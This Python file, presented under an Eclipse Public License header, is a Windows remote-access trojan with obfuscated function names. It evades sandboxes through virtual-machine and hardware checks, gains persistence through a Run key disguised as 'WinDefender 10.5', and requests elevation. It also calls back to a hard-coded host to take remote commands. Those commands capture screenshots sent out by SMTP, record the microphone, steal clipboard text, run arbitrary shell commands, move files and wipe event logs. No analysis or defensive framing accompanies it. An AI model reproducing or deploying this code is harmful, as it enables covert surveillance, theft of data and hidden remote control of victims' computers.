
#Eclipse Public License - v 2.0
#THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
#PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
#OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.
from PIL import ImageGrab
import socket
import smtplib
import base64
import os
import platform
import sounddevice
from scipy.io.wavfile import write
import time
import random, string
import psutil
import subprocess
import winreg as reg
from colorama import Fore, Back, Style
import shutil
import ctypes
import sys
def zpVXAIPnyaQaYr():
    vmproc1 = "vmsrvc.exe"
    vmproc2 = "vmusrvc.exe"
    vmproc3 = "vmtoolsd.exe"
    vmproc5 = "vboxtry.exe"
    vmproc6 = "df5serv.exe"
    vmproc7 = "vboxservice.exe"
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() == vmproc1.lower() or proc.name().lower() == vmproc2.lower() or proc.name().lower() == vmproc3.lower() or proc.name().lower() == vmproc5.lower() or proc.name().lower() == vmproc6.lower() or proc.name().lower() == vmproc7.lower():
                exit()
        except WindowsError:
            vmpath1 = os.path.exists(r"C:\windows\system32\driversmci.sys")
            vmpath2 = os.path.exists(r"C:\windows\system32\driversmhgfs.sys")
            vmpath3 = os.path.exists(r"C:\windows\system32\driversmmouse.sys")
            vmpath4 = os.path.exists(r"C:\windows\system32\driversmscsi.sys")
            vmpath5 = os.path.exists(r"C:\windows\system32\driversmusemouse.sys")
            vmpath6 = os.path.exists(r"C:\windows\system32\driversmx_svga.sys")
            vmpath7 = os.path.exists(r"C:\windows\system32\driversmxnet.sys")
            vmpath8 = os.path.exists(r"C:\windows\system32\drivers\VBoxMouse.sys")
            if vmpath1 == True or vmpath2 == True or vmpath3 == True or vmpath4 == True or vmpath5 == True or vmpath6 == True or vmpath7 == True or vmpath8 == True:
                exit()
zpVXAIPnyaQaYr()
letters = ''.join(random.choice(string.ascii_letters) for l in range(16))
X = 0
letters = time.sleep(X)
letters
def zJnWJKrmzwZTAHJT(f_name, path):
    address=os.path.join(path, f_name)
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, "WinDefender 10.5", 0, reg.REG_SZ, address)
    reg.CloseKey(open)
def XbNcYPeberQMdl(f_name, path):
    address=os.path.join(path, f_name)
    shutil.copytree(address, "C:\windows\system32", dirs_exist_ok=True)
    shutil.copytree(address, "C:\windows", dirs_exist_ok=True)
BUFFER_SIZE = 1024
def connection():
    try:
        clientHOST = base64.b64encode(bytes("10.10.1.107", 'utf-8'))
        clientPORT = 4434
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((clientHOST, clientPORT))
        s.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
        sys.setrecursionlimit(1500)
        while True:
            Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
            if Handler_DATA == "screenshot":
                screenshot = ImageGrab.grab()
                file = "xpvuNBYVvC.jpg"
                screenshot.save(file)
                f = open(file, 'rb')
                data=f.read()
                data=base64.b64encode(data)
                f.close()
                os.remove(file)
                smtp = smtplib.SMTP('smtp.gmail.com', 587)
                smtp.starttls()
                smtp.login("revise7@example.com", "P@$$W0RD_ON3")
                message = data
                smtp.sendmail("revise7@example.com", "revise7@example.com", message)
                smtp.quit()
            elif Handler_DATA == "mic record":
                frames = 44100
                seconds = 600
                channel = 1
                record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
                sounddevice.wait()
                file = "skiDkZX92DKOsdzHlki.wav"
                write(file, frames, record)
                with open(file, 'rb') as f:
                    for l in f: s.sendall(l)
                    time.sleep(10)
                    os.remove(file)
            elif Handler_DATA == "restart":
                if platform.system() == "Windows":
                    os.system("shutdown -t 0 -r -f")
                else:
                    os.system("reboot")
            elif Handler_DATA == "shutdown":
                if platform.system() == "Windows":
                    os.system("shutdown /s /t 1")
                else:
                    os.system("shutdown now")
            elif Handler_DATA == "exit":
                s.close()
                exit()
            elif Handler_DATA == "shell":
                    cwd = os.getcwd()
                    s.send(("dir:" + str(cwd)).encode('utf-8'))
                    while True:
                        try:
                            command = s.recv(2048).strip().decode('utf-8')
                            if 'terminate' in command:
                                    try:
                                        ctypes.windll.shell32.IsUserAnAdmin()
                                    except:
                                        False
                                    if True:
                                        os.system('for /f %x in ("wevtutil el") do wevtutil cl "%x"')
                                    break
                            elif 'eventlog -cls' in command:
                                try:
                                    ctypes.windll.shell32.IsUserAnAdmin()
                                except:
                                    False
                                if True:
                                    os.system('for /f %x in ("wevtutil el") do wevtutil cl "%x"')
                            elif 'clipboard' in command:
                                CF_TEXT = 1
                                kernel32 = ctypes.windll.kernel32
                                user32 = ctypes.windll.user32
                                kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
                                kernel32.GlobalLock.restype = ctypes.c_void_p
                                kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
                                user32.GetClipboardData.restype = ctypes.c_void_p
                                user32.OpenClipboard(0)
                                IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
                                GetClipboardData = user32.GetClipboardData
                                CloseClipboard = user32.CloseClipboard
                                try:
                                    if IsClipboardFormatAvailable(CF_TEXT):
                                        getClipboardData = GetClipboardData(CF_TEXT)
                                        getClipboardDataLoc = kernel32.GlobalLock(getClipboardData)
                                        text = ctypes.c_char_p(getClipboardDataLoc)
                                        value = text.value
                                        kernel32.GlobalUnlock(getClipboardDataLoc)
                                        s.send(str(value).encode("utf-8"))
                                    if IsClipboardFormatAvailable(CF_TEXT) == False:
                                        pass
                                finally:
                                    CloseClipboard()
                            elif command.startswith('marciless'):
                                file_name = command[7:]
                                pth = os.getcwd()
                                try:
                                    XbNcYPeberQMdl(file_name, pth)
                                except Exception as e:
                                    s.send(str(e).encode('utf-8'))
                            elif command.startswith('grab'):
                                file_name = command[5:]
                                file_size = os.path.getsize(file_name)
                                s.send(file_name.encode('utf-8'))
                                s.recv(1024).decode('utf-8')
                                s.send(str(file_size).encode('utf-8'))
                                s.recv(1024).decode('utf-8')
                                with open(file_name, "rb") as file:
                                    c = 0
                                    start_time = time.time()
                                    while c < file_size:
                                        data = file.read(1024)
                                        if not (data):
                                            break
                                        s.sendall(data)
                                        c += len(data)
                                    end_time = time.time()
                            elif 'transfer' in command:
                                file_name = s.recv(1024).decode('utf-8')
                                s.send('OK'.encode('utf-8'))
                                file_size = s.recv(1024).decode('utf-8')
                                s.send('OK'.encode('utf-8'))
                                with open(file_name, "wb") as file:
                                    c = 0
                                    start_time = time.time()
                                    while c < int(file_size):
                                        data = s.recv(1024)
                                        if not (data):
                                            break
                                        file.write(data)
                                        c += len(data)
                                    end_time = time.time()
                            elif command.startswith('cd '):
                                dir = command[3:]
                                try:
                                    os.chdir(dir)
                                except:
                                    os.chdir(cwd)
                                cwd = os.getcwd()
                                s.send(("dir:" + str(cwd)).encode('utf-8'))
                            elif command.startswith('persistence'):
                                file_name = command[12:]
                                pth = os.getcwd()
                                try:
                                    zJnWJKrmzwZTAHJT(file_name, pth)
                                    s.send("OK".encode('utf-8'))
                                except Exception as e:
                                    s.send(str(e).encode('utf-8'))
                            else:
                                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                out = CMD.stdout.read()
                                err = CMD.stderr.read()
                                s.send(out)
                                s.send(err)
                                if (out == b'' and err == b''):
                                    s.send("OK".encode('utf-8'))
                        except Exception as e:
                            s.send(str(e).encode('utf-8'))
    except socket.error:
        connection()
        if connection() == True:
            pass
        else:
            connection()
    except MemoryError:
        pass
    except SystemError:
        pass
def TeZfZTttAYMjZZ():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if TeZfZTttAYMjZZ():
    connection()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
TeZfZTttAYMjZZ()
def TCjgbxixqsdxEc():
    cpuChk = psutil.cpu_count(logical=False)
    if cpuChk == 1:
        exit()
    if cpuChk == 3:
        exit()
    else:
        connection()
TCjgbxixqsdxEc()
def PTYMEYUXBRwddE():
    avgDiskChk = shutil.disk_usage("/")
    div = (avgDiskChk // (2**30))
    if div == 59:
        exit()
    if div == 60:
        exit()
    if div == 65:
        exit()
    if div == 120:
        exit()
    if div == 119:
        exit()
    else:
        connection()
PTYMEYUXBRwddE()
